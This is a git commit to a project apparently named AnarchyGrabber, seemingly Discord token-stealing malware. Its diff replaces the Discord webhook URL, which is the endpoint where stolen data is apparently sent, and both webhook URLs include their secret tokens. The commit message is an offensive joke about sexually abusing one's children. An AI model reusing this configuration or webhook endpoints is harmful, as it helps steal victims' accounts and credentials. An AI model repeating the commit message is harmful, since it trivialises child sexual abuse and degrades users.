fae8e6fa6cc9a28216665326465c26bb9a50caa5
iLinked <ilinkedisameme@gmail.com>
2020-03-14 17:03:03 +0100

    ever just have sex with ur children?

--- AnarchyGrabber/Settings.cs
+++ AnarchyGrabber/Settings.cs
@@ -2,6 +2,6 @@
 {
     class Settings
     {
-        public static string Webhook = "https://discordapp.com/api/webhooks/688034401027883030/pYNzhfpDG62HGfTUIOOTsXbJa1hSVbMJvWnoxtGkbTexfjQgRT8nA5wqQID0GOQbGz9E";
+        public static string Webhook = "https://discordapp.com/api/webhooks/688416573660070032/ei3JruxvDlOiuSaOPIrTDKQt8wMKXYos-0COTUa9WpmTXcTCr_QinSs5dpmucln8QwzD";
     }
 }
